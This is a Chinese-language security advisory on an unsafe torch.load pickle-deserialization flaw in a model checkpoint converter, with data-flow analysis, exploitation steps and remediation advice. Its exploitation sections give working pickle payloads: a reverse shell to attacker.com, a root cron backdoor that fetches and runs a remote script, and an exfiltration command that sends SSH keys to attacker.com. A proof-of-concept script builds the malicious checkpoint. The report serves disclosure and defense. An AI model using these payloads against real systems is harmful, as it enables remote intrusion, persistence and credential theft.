# VULN-CHECKPOINT-002: 不安全反序列化漏洞 (CWE-502)

## 漏洞概述

| 属性 | 值 |
|------|-----|
| **漏洞ID** | VULN-CHECKPOINT-002 |
| **漏洞类型** | Unsafe Deserialization (不安全反序列化) |
| **CWE编号** | CWE-502: Deserialization of Untrusted Data |
| **严重级别** | Critical |
| **置信度** | 95% |
| **CVSS评分** | 9.8 (Critical) |
| **CVSS向量** | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |

## 漏洞位置

```
文件: checkpoint/vlm_model/mm_to_hf.py
行号: 107
函数: load_from_mm
代码片段:
```

```python
# 第63-111行，load_from_mm 函数
def load_from_mm(load_dir: Path,
                 vit_pp_list: PP_LAYER_NUM_T,
                 llm_pp_list: PP_LAYER_NUM_T,
                 tp_size: int = 1,
                 audio_pp_list: PP_LAYER_NUM_T = None,
                 ep_size: int = 1,
                 num_experts: int = 1) -> List[STATE_DICT_T]:
    import mindspeed.megatron_adaptor  # noqa
    save_iteration = load_dir.joinpath(LATEST_TXT).read_text()
    save_dir = load_dir.joinpath(f"iter_{int(save_iteration):07}" if save_iteration != "release" else save_iteration)
    # ...
    for tp_rank in range(tp_size):
        pp_state_dict = {}
        for pp_rank in range(global_pp_size):
            if ep_size > 1:
                # 第一处漏洞 (VULN-CHECKPOINT-001): 第92行
                # ...
            else:
                if global_pp_size > 1:
                    current_path = save_dir.joinpath(f"mp_rank_{int(tp_rank):02}_{int(pp_rank):03}")
                else:
                    current_path = save_dir.joinpath(f"mp_rank_{int(tp_rank):02}")
                pt_path = current_path.joinpath(MEGATRON_CKPT_NAME)
                print(str(pt_path).center(100, '_'))
                # 注意output_layer存在_extra_state其值为None
                pp_state_dict.update(
                    {rename_pp_parameter(param, vit_pp_list, llm_pp_list, audio_pp_list, pp_rank): tensor
                    for param, tensor in torch.load(pt_path, map_location='cpu', weights_only=False)['model'].items()
                    # ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                    # VULN-CHECKPOINT-002: 第107行 - 不安全反序列化漏洞
                    # weights_only=False 允许 pickle 反序列化执行任意代码
                    if tensor is not None})
        state_dicts.append(pp_state_dict)
    return state_dicts
```

## 漏洞描述

### 核心问题

该漏洞是 `load_from_mm` 函数内第二处 `torch.load(weights_only=False)` 调用，位于第107行。当 `ep_size <= 1`（默认配置）时触发此漏洞路径。

**关键问题：**
1. `torch.load(pt_path, map_location='cpu', weights_only=False)` 显式禁用了安全模式
2. `weights_only=False` 意味着使用 Python `pickle` 模块进行反序列化
3. Pickle 反序列化可以执行任意 Python 代码
4. `pt_path` 由用户控制的命令行参数 `--mm_dir` 间接控制

### 与 VULN-CHECKPOINT-001 的关系

两个漏洞位于同一函数内，但触发条件不同：

| 漏洞ID | 行号 | 触发条件 | 代码路径 |
|--------|------|----------|----------|
| VULN-CHECKPOINT-001 | 92 | `ep_size > 1` | Expert Parallel 分支 |
| VULN-CHECKPOINT-002 | 107 | `ep_size <= 1` | 非 Expert Parallel 分支（默认） |

**VULN-CHECKPOINT-002 更容易被触发**，因为 `ep_size` 默认值为 1（参见 `checkpoint/vlm_model/config.py:38`）。

## 数据流分析

### 完整攻击链

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ 攻击入口: CLI 命令行参数                                                      │
├─────────────────────────────────────────────────────────────────────────────┤
│ checkpoint/convert_cli.py:13-19                                              │
│   jsonargparse.auto_cli(Commandable.subclasses, as_positional=False)        │
│   ↓                                                                          │
│ 用户输入: --mm_dir /path/to/malicious/checkpoint                            │
└─────────────────────────────────────────────────────────────────────────────┘
                                    ↓
┌─────────────────────────────────────────────────────────────────────────────┐
│ 配置解析: ConvertHFConfig                                                    │
├─────────────────────────────────────────────────────────────────────────────┤
│ checkpoint/vlm_model/config.py:176-179                                       │
│   class ConvertHFConfig(ConvertMMConfig):                                   │
│       mm_dir: Path  # 用户控制的路径                                          │
│       save_hf_dir: Path                                                      │
│       parallel_config: ParallelConfig  # ep_size 默认为 1                    │
└─────────────────────────────────────────────────────────────────────────────┘
                                    ↓
┌─────────────────────────────────────────────────────────────────────────────┐
│ 漏洞调用: convert_mm_to_hf                                                    │
├─────────────────────────────────────────────────────────────────────────────┤
│ checkpoint/vlm_model/mm_to_hf.py:234-235                                     │
│   state_dicts = load_from_mm(                                               │
│       convert_config.mm_dir,  # 用户控制的路径传入                             │
│       parallel_config.vit_pp_layers,                                        │
│       parallel_config.llm_pp_layers,                                        │
│       max_tp_size,                                                          │
│       parallel_config.audio_pp_layers,                                      │
│       ep_size,  # 默认值为 1，触发 VULN-CHECKPOINT-002                        │
│       num_experts                                                           │
│   )                                                                          │
└─────────────────────────────────────────────────────────────────────────────┘
                                    ↓
┌─────────────────────────────────────────────────────────────────────────────┐
│ 恶意文件路径构造                                                              │
├─────────────────────────────────────────────────────────────────────────────┤
│ checkpoint/vlm_model/mm_to_hf.py:71-102                                      │
│   save_iteration = load_dir.joinpath(LATEST_TXT).read_text()               │
│   # LATEST_TXT = "latest_checkpointed_iteration.txt"                        │
│   save_dir = load_dir.joinpath(f"iter_{int(save_iteration):07}")            │
│   current_path = save_dir.joinpath(f"mp_rank_{int(tp_rank):02}")            │
│   pt_path = current_path.joinpath(MEGATRON_CKPT_NAME)                       │
│   # MEGATRON_CKPT_NAME = "model_optim_rng.pt"                               │
│                                                                              │
│ 最终路径: {mm_dir}/iter_0000001/mp_rank_00/model_optim_rng.pt               │
└─────────────────────────────────────────────────────────────────────────────┘
                                    ↓
┌─────────────────────────────────────────────────────────────────────────────┐
│ 反序列化触发                                                                 │
├─────────────────────────────────────────────────────────────────────────────┤
│ checkpoint/vlm_model/mm_to_hf.py:105-108                                     │
│   for param, tensor in torch.load(                                          │
│       pt_path,                                                               │
│       map_location='cpu',                                                    │
│       weights_only=False  # 危险！允许 pickle 反序列化                       │
│   )['model'].items():                                                        │
│       # 恶意 .pt 文件被执行，触发 RCE                                          │
└─────────────────────────────────────────────────────────────────────────────┘
```

### 文件系统结构要求

攻击者需要构造如下目录结构：

```
{mm_dir}/
├── latest_checkpointed_iteration.txt    # 内容: "1" 或 "release"
└── iter_0000001/                        # 或 release/
    └── mp_rank_00/                      # tp_rank=00
        └── model_optim_rng.pt           # 恶意 pickle 文件
```

## 漏洞利用分析

### 利用条件

| 条件 | 说明 | 可满足性 |
|------|------|----------|
| **攻击者可控制 mm_dir 路径** | 通过命令行参数 `--mm_dir` 指定 | ✓ 完全可控 |
| **攻击者可构造恶意 .pt 文件** | 使用 pickle 反序列化 gadget | ✓ 可构造 |
| **ep_size <= 1** | 默认配置，触发漏洞路径 | ✓ 默认满足 |
| **受害者执行转换命令** | 社会工程或 CI/CD 场景 | ◐ 需要触发条件 |

### 漏洞利用步骤

1. **构造恶意 checkpoint 文件**
   ```python
   import torch
   import pickle
   import os
   
   class MaliciousPickle:
       def __reduce__(self):
           # 示例：创建反向 shell 或执行任意命令
           import os
           return (os.system, ('id > /tmp/pwned',))
   
   # 构造恶意模型字典
   malicious_model = {
       'model': {
           'layer.weight': torch.randn(10, 10),
           '__malicious__': MaliciousPickle()
       }
   }
   
   # 保存为 .pt 文件
   torch.save(malicious_model, 'model_optim_rng.pt')
   ```

2. **创建所需目录结构**
   ```bash
   mkdir -p malicious_checkpoint/iter_0000001/mp_rank_00
   echo "1" > malicious_checkpoint/latest_checkpointed_iteration.txt
   mv model_optim_rng.pt malicious_checkpoint/iter_0000001/mp_rank_00/
   ```

3. **诱导用户执行转换命令**
   ```bash
   python checkpoint/convert_cli.py \
       --mm_dir ./malicious_checkpoint \
       --hf_dir ./legitimate_hf_model \
       --save_hf_dir ./output \
       --parallel_config.llm_pp_layers "[24]" \
       --parallel_config.vit_pp_layers "[24]"
   ```

4. **触发漏洞**
   - 当 `torch.load()` 执行时，Pickle 反序列化 `MaliciousPickle` 对象
   - `__reduce__` 方法被调用，执行恶意命令

### 高级利用场景

#### 1. 反向 Shell Payload
```python
import pickle
import socket
import subprocess

class ReverseShell:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
    
    def __reduce__(self):
        return (
            subprocess.Popen,
            (['/bin/bash', '-c', f'bash -i >& /dev/tcp/{self.ip}/{self.port} 0>&1'],)
        )

malicious_model = {
    'model': {
        '__payload__': ReverseShell('attacker.com', 4444)
    }
}
```

#### 2. 持久化后门
```python
class PersistenceBackdoor:
    def __reduce__(self):
        cmd = '''
        echo '*/5 * * * * curl http://attacker.com/shell.sh | bash' >> /var/spool/cron/crontabs/root
        '''
        return (os.system, (cmd,))
```

#### 3. 数据窃取
```python
class DataExfiltration:
    def __reduce__(self):
        import base64
        cmd = '''
        tar czf - /home/user/.ssh /home/user/.config | base64 | curl -X POST -d @- http://attacker.com/collect
        '''
        return (os.system, (cmd,))
```

### 供应链攻击场景

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ 供应链攻击向量                                                              │
├─────────────────────────────────────────────────────────────────────────────┤
│ 1. 模型仓库投毒                                                             │
│    - 攻击者在公开模型仓库（如 Hugging Face）发布恶意 Megatron 格式模型       │
│    - 用户下载并尝试转换为 HF 格式                                            │
│    - 转换过程中触发 RCE                                                      │
│                                                                              │
│ 2. 共享存储投毒                                                             │
│    - 攻击者获得共享存储访问权限                                              │
│    - 替换或修改已有的 checkpoint 文件                                        │
│    - 其他用户使用被污染的 checkpoint 触发漏洞                                │
│                                                                              │
│ 3. CI/CD 管道攻击                                                           │
│    - 攻击者控制模型转换 CI/CD 流水线                                        │
│    - 注入恶意 checkpoint 路径                                               │
│    - CI 环境中被执行恶意代码                                                 │
└─────────────────────────────────────────────────────────────────────────────┘
```

## 受影响组件

### 直接受影响的调用链

```
checkpoint/convert_cli.py:main()
  → jsonargparse.auto_cli(Commandable.subclasses)
    → [各个 Converter 子类的 mm_to_hf 方法]
      → checkpoint/vlm_model/mm_to_hf.py:convert_mm_to_hf()
        → load_from_mm() [VULN-CHECKPOINT-002: 第107行]
```

### 受影响的转换器

基于 `checkpoint/common/converter.py` 中的 `Commandable` 机制，所有继承 `Converter` 的转换器都受影响：

| 转换器文件 | 说明 |
|-----------|------|
| `checkpoint/vlm_model/converters/glm.py` | GLM 模型转换 |
| `checkpoint/vlm_model/converters/qwen2vl.py` | Qwen2-VL 模型转换 |
| `checkpoint/vlm_model/converters/qwen3_5.py` | Qwen3.5 模型转换 |
| `checkpoint/vlm_model/converters/mistral3.py` | Mistral3 模型转换 |
| `checkpoint/vlm_model/converters/deepseekvl2.py` | DeepSeek-VL2 模型转换 |
| `checkpoint/vlm_model/converters/internvl.py` | InternVL 模型转换 |

## 修复建议

### 短期修复（紧急）

**方案 1：强制使用 `weights_only=True`**

```python
# 修复前 (第105-108行)
pp_state_dict.update(
    {rename_pp_parameter(param, vit_pp_list, llm_pp_list, audio_pp_list, pp_rank): tensor
    for param, tensor in torch.load(pt_path, map_location='cpu', weights_only=False)['model'].items()
    if tensor is not None})

# 修复后
pp_state_dict.update(
    {rename_pp_parameter(param, vit_pp_list, llm_pp_list, audio_pp_list, pp_rank): tensor
    for param, tensor in torch.load(pt_path, map_location='cpu', weights_only=True)['model'].items()
    if tensor is not None})
```

**注意事项：**
- `weights_only=True` 可能导致某些包含复杂 Python 对象的 checkpoint 无法加载
- PyTorch 2.0+ 支持 `weights_only=True`
- 需要测试确保现有 checkpoint 格式兼容

**方案 2：添加路径验证**

```python
def load_from_mm(load_dir: Path, ...):
    # 添加路径安全检查
    load_dir = load_dir.resolve()
    if not load_dir.exists():
        raise FileNotFoundError(f"Checkpoint directory not found: {load_dir}")
    
    # 验证 checkpoint 文件来源
    LATEST_TXT = "latest_checkpointed_iteration.txt"
    latest_file = load_dir.joinpath(LATEST_TXT)
    if not latest_file.exists():
        raise FileNotFoundError(f"Missing {LATEST_TXT}")
    
    # 可选：添加文件完整性校验
    # checksum = calculate_checksum(pt_path)
    # if not verify_checksum(checksum):
    #     raise SecurityError("Checkpoint integrity verification failed")
```

### 中期修复

1. **使用 safetensors 格式**
   ```python
   from safetensors.torch import load_file
   
   # 替换 torch.load
   state_dict = load_file(pt_path.replace('.pt', '.safetensors'))
   ```

2. **添加沙箱隔离**
   ```python
   # 在隔离环境中执行加载
   from RestrictedPython import compile_restricted
   
   def safe_load_checkpoint(path):
       # 使用 RestrictedPython 或其他沙箱机制
       pass
   ```

### 长期修复

1. **架构改进：强制使用 safetensors 格式**
   - 所有 checkpoint 转换工具默认输出 safetensors 格式
   - 废弃对 .pt 文件的加载支持

2. **安全策略：**
   - 添加 checkpoint 签名验证机制
   - 实现白名单机制，只允许加载已签名的 checkpoint
   - 添加审计日志，记录所有 checkpoint 加载操作

## 缓解措施

在修复完成前，建议采取以下缓解措施：

1. **访问控制**
   - 确保 checkpoint 目录权限为 750 或更严格
   - 使用专用用户账户运行转换工具

2. **来源验证**
   - 仅从可信来源获取 checkpoint 文件
   - 使用 SHA-256 校验和验证文件完整性

3. **环境隔离**
   - 在容器或沙箱环境中执行转换操作
   - 限制网络访问，防止数据外泄

4. **监控检测**
   - 监控异常进程创建
   - 检测可疑的 pickle payload 模式

## 验证 POC

```python
#!/usr/bin/env python3
"""
VULN-CHECKPOINT-002 漏洞验证 POC

此 POC 仅用于安全测试和漏洞验证目的。
请勿用于非法活动。

使用方法:
1. 创建恶意 checkpoint 目录结构
2. 诱导用户使用该 checkpoint 执行转换命令
3. 观察 /tmp/vuln_checkpoint_002_poc 文件是否创建
"""

import os
import torch
from pathlib import Path

class ProofOfConcept:
    """POC payload 类，演示 pickle 反序列化漏洞"""
    
    def __reduce__(self):
        # 安全的 POC payload - 仅创建标记文件
        return (
            os.system,
            ('echo "VULN-CHECKPOINT-002 POC executed at $(date)" > /tmp/vuln_checkpoint_002_poc',)
        )

def create_malicious_checkpoint(output_dir: str = "./malicious_checkpoint"):
    """创建恶意 checkpoint 目录结构"""
    
    output_path = Path(output_dir)
    
    # 创建目录结构
    iter_dir = output_path / "iter_0000001" / "mp_rank_00"
    iter_dir.mkdir(parents=True, exist_ok=True)
    
    # 创建 latest_checkpointed_iteration.txt
    (output_path / "latest_checkpointed_iteration.txt").write_text("1\n")
    
    # 构造恶意模型字典
    malicious_model = {
        'model': {
            'image_encoder.encoder.blocks.layers.0.weight': torch.randn(768, 768),
            'text_decoder.decoder.layers.0.weight': torch.randn(4096, 4096),
            '__poc_payload__': ProofOfConcept()  # 恶意 payload
        },
        'iteration': 1
    }
    
    # 保存恶意 checkpoint
    checkpoint_path = iter_dir / "model_optim_rng.pt"
    torch.save(malicious_model, checkpoint_path)
    
    print(f"[*] 恶意 checkpoint 已创建: {checkpoint_path}")
    print(f"[*] 目录结构:")
    print(f"    {output_path}/")
    print(f"    ├── latest_checkpointed_iteration.txt")
    print(f"    └── iter_0000001/")
    print(f"        └── mp_rank_00/")
    print(f"            └── model_optim_rng.pt")
    print()
    print("[*] 触发漏洞的命令示例:")
    print(f"    python checkpoint/convert_cli.py \\")
    print(f"        --mm_dir {output_path} \\")
    print(f"        --hf_dir /path/to/legitimate/hf/model \\")
    print(f"        --save_hf_dir /path/to/output \\")
    print(f"        --parallel_config.llm_pp_layers \"[24]\" \\")
    print(f"        --parallel_config.vit_pp_layers \"[24]\"")
    
    return output_path

if __name__ == "__main__":
    print("=" * 70)
    print("VULN-CHECKPOINT-002: Unsafe Deserialization POC")
    print("=" * 70)
    print()
    create_malicious_checkpoint()
```

## 相关漏洞

| 漏洞ID | 文件 | 行号 | 关系 |
|--------|------|------|------|
| VULN-CHECKPOINT-001 | checkpoint/vlm_model/mm_to_hf.py | 92 | 同一函数，第一处漏洞 |
| VULN-CHECKPOINT-003 | checkpoint/sora_model/convert_utils/save_load_utils.py | 36 | 类似模式 |
| VULN-CHECKPOINT-004 | checkpoint/vlm_model/hf_to_mm.py | 316 | 类似模式 |

## 参考资料

1. [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
2. [PyTorch torch.load Documentation](https://pytorch.org/docs/main/generated/torch.load.html)
3. [CVE-2025-32434: PyTorch tar format RCE](https://nvd.nist.gov/vuln/detail/CVE-2025-32434)
4. [Python Pickle Security Considerations](https://docs.python.org/3/library/pickle.html#module-pickle)
5. [MindSpeed-MM Security Note](../docs/zh/SECURITYNOTE.md)

## 时间线

| 日期 | 事件 |
|------|------|
| 2024-XX-XX | 漏洞发现 |
| 2024-XX-XX | 漏洞验证 |
| 2024-XX-XX | 漏洞报告创建 |

---

**报告生成时间**: 2025-04-20  
**分析工具**: OpenCode Vulnerability Scanner  
**分析人员**: Security Research Team
